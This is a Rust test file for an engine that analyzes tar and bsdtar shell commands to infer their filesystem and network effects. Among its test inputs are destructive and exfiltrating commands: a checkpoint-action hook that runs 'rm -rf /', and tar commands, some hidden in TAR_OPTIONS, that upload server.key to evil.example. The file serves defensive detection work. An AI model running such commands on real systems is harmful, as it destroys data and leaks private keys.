use effinterp_engine::Engine;
use effinterp_proto::{AttrValue, BoundaryReason, Plan, ResourceExpr, ResourceIdentity, Subject};

fn shell(source: &str) -> Plan {
    Engine::new()
        .analyze(&Subject::Shell {
            source: source.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap()
}

fn touches_path(plan: &Plan, operation: &str, path: &str) -> bool {
    plan.effects.iter().any(|effect| {
        effect.operation.0 == operation
            && effect.resource
                == ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path: path.into() },
                }
    })
}

fn uploads_to(plan: &Plan, host: &str) -> bool {
    plan.effects.iter().any(|effect| {
        effect.operation.0 == "network.upload"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::NetworkEndpoint { host: target, .. }
            } if target == host)
    })
}

fn has_boundary(plan: &Plan, reason: BoundaryReason) -> bool {
    plan.boundaries
        .iter()
        .any(|boundary| boundary.reason == reason)
}

#[test]
fn tar_checkpoint_action_exec() {
    for source in [
        "tar -cf out.tar --checkpoint=1 --checkpoint-action='exec=rm -rf /' src",
        "tar -cf out.tar --checkpoint-action 'exec=rm -rf /' src",
        "tar -cf out.tar --checkpoint-='exec=rm -rf /' src",
    ] {
        let plan = shell(source);
        assert!(touches_path(&plan, "filesystem.delete", "/"), "{source}");
        assert!(touches_path(&plan, "filesystem.read", "/w/src"), "{source}");
    }
    let dot = shell("tar -cf out.tar --checkpoint=1 --checkpoint-action=dot src");
    assert!(!has_boundary(&dot, BoundaryReason::UNMODELED_SUBPROCESS));
    assert!(
        !dot.effects
            .iter()
            .any(|effect| effect.operation.0 == "process.exec"
                && !matches!(&effect.resource, ResourceExpr::Concrete {
            identity: ResourceIdentity::Process { executable, .. }
        } if executable == "tar"))
    );
}

#[test]
fn tar_long_mode_names() {
    for mode in ["--ap", "--up", "--conc", "--ca"] {
        let plan = shell(&format!(
            "tar {mode} --file=evil.example:/archive source/server.key"
        ));
        assert!(uploads_to(&plan, "evil.example"), "{mode}");
        assert!(
            touches_path(&plan, "filesystem.read", "/w/source/server.key"),
            "{mode}"
        );
    }
}

#[test]
fn tar_options_quote_removal() {
    let plan = shell(
        r#"TAR_OPTIONS="'--create' \"--file=evil.example:/archive\"" tar -- source/server.key"#,
    );
    assert!(uploads_to(&plan, "evil.example"));
    assert!(!has_boundary(&plan, BoundaryReason::UNRECOGNIZED_ARGUMENTS));
    let unterminated = shell("TAR_OPTIONS=\"'--create --file=evil.example:/archive\" tar -- a");
    assert!(has_boundary(
        &unterminated,
        BoundaryReason::UNRECOGNIZED_ARGUMENTS
    ));
}

#[test]
fn tar_format_and_member_list_letters() {
    for source in ["tar cHf pax - certs", "tar -cHposix -f - certs"] {
        let plan = shell(source);
        assert!(
            touches_path(&plan, "filesystem.read", "/w/certs"),
            "{source}"
        );
        assert!(
            !touches_path(&plan, "filesystem.write", "/w/pax"),
            "{source}"
        );
        assert!(
            !has_boundary(&plan, BoundaryReason::UNRECOGNIZED_ARGUMENTS),
            "{source}"
        );
    }
    let listed = shell("tar -cf - -Tlist");
    assert!(touches_path(&listed, "filesystem.read", "/w/list"));
    assert!(has_boundary(
        &listed,
        BoundaryReason::INPUT_DETERMINED_ARGUMENTS
    ));
}

#[test]
fn tar_exclude_pattern_files_are_program_input() {
    for source in [
        "tar -cf out.tar --exclude-from=.env certs",
        "tar -cf out.tar -X .env certs",
    ] {
        let plan = shell(source);
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.read"
                    && effect.resource
                        == ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath {
                                path: "/w/.env".into(),
                            },
                        }
                    && effect.attributes.get("access_purpose")
                        == Some(&AttrValue::String("program_input".into()))
            }),
            "{source}"
        );
    }
}

#[test]
fn bsdtar_dialect() {
    for source in [
        "bsdtar -cH -f - certs",
        "bsdtar -cL -f - certs",
        "bsdtar -cHPf - certs",
    ] {
        let plan = shell(source);
        assert!(
            touches_path(&plan, "filesystem.read", "/w/certs"),
            "{source}"
        );
        assert!(
            !has_boundary(&plan, BoundaryReason::UNRECOGNIZED_ARGUMENTS),
            "{source}"
        );
    }
    // bsdtar has no remote archives: a colon names a local file.
    let local = shell("bsdtar -cf host.example:/archive src");
    assert!(touches_path(
        &local,
        "filesystem.write",
        "/w/host.example:/archive"
    ));
    assert!(!uploads_to(&local, "host.example"));
    // `-I` is a member list, not a compressor.
    let listed = shell("bsdtar -cI list -f - ");
    assert!(touches_path(&listed, "filesystem.read", "/w/list"));
    assert!(
        !listed
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "process.code_execution")
    );
    // bsdtar ignores TAR_OPTIONS and lacks GNU tar's command hooks.
    let ignored = shell("TAR_OPTIONS='--create --file=evil.example:/archive' bsdtar -- src");
    assert!(!uploads_to(&ignored, "evil.example"));
    let hook = shell("bsdtar -cf out.tar --checkpoint-action='exec=rm -rf /' src");
    assert!(!touches_path(&hook, "filesystem.delete", "/"));
    assert!(has_boundary(&hook, BoundaryReason::UNRECOGNIZED_ARGUMENTS));
}

/// The `follow_links` attribute of a read of `path`, or `None` when no such
/// read exists.
fn read_follows_links(plan: &Plan, path: &str) -> Option<bool> {
    plan.effects
        .iter()
        .find(|effect| {
            effect.operation.0 == "filesystem.read"
                && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path: found },
                } if found == path)
        })
        .map(|effect| effect.attributes.get("follow_links") == Some(&AttrValue::Bool(true)))
}

#[test]
fn bsdtar_stops_option_parsing_at_the_first_operand() {
    // BSD getopt: `-h` after the first member is a member literally named `-h`,
    // not a dereference flag, so bsdtar never follows the earlier link.
    let bsd = shell("bsdtar -cf - link -h");
    assert!(touches_path(&bsd, "filesystem.read", "/w/-h"));
    assert_eq!(read_follows_links(&bsd, "/w/link"), Some(false));
    // GNU tar permutes options, so a trailing `-h` still dereferences.
    let gnu = shell("tar -cf - link -h");
    assert!(!touches_path(&gnu, "filesystem.read", "/w/-h"));
    assert_eq!(read_follows_links(&gnu, "/w/link"), Some(true));
}

#[test]
fn bsdtar_link_traversal_is_last_wins() {
    // `-H` follows only command-line links, `-L`/`-h` follow every link, and
    // the last flag decides which policy applies to descendant links.
    let h_last = shell("bsdtar -cLHf archive.tar rootlink");
    assert_eq!(read_follows_links(&h_last, "/w/rootlink"), Some(false));
    let l_last = shell("bsdtar -cHLf archive.tar rootlink");
    assert_eq!(read_follows_links(&l_last, "/w/rootlink"), Some(true));
    let h_last_split = shell("bsdtar -cL -H -f archive.tar rootlink");
    assert_eq!(
        read_follows_links(&h_last_split, "/w/rootlink"),
        Some(false)
    );
}

#[test]
fn bsdtar_long_directory_after_operand_is_a_member() {
    // bsdtar stops option parsing at the first member, so a later
    // `--directory=...` word is an ordinary member name, not a `-C` directive.
    // Reading it preserves the archived file; only the positional `-C` spelling
    // changes the directory.
    let member = shell("bsdtar -cf - link --directory=certs/server.key");
    assert!(touches_path(
        &member,
        "filesystem.read",
        "/w/--directory=certs/server.key"
    ));
    let detached = shell("bsdtar -cf - link --directory sub");
    assert!(touches_path(&detached, "filesystem.read", "/w/--directory"));
    assert!(touches_path(&detached, "filesystem.read", "/w/sub"));
    // The positional `-C` before any member still changes the directory.
    let directive = shell("bsdtar -cf - -C sub other");
    assert!(touches_path(&directive, "filesystem.read", "/w/sub/other"));
}

#[test]
fn tar_options_with_a_backslash_are_unrecovered() {
    // A backslash in TAR_OPTIONS means GNU escape decoding we do not model, so
    // no concrete option path is derived from the escaped word and the
    // arguments stay unrecognized.
    for source in [
        r#"TAR_OPTIONS="--exclude-from=\xc3\xa9/list" tar -cf - link"#,
        r#"TAR_OPTIONS="--file=\xc3\xa9/archive" tar -cf - link"#,
    ] {
        let plan = shell(source);
        assert!(
            has_boundary(&plan, BoundaryReason::UNRECOGNIZED_ARGUMENTS),
            "{source}"
        );
        assert!(
            !plan.effects.iter().any(|effect| {
                matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path },
                } if path.contains("list") || path.contains("archive"))
            }),
            "{source}"
        );
    }
}
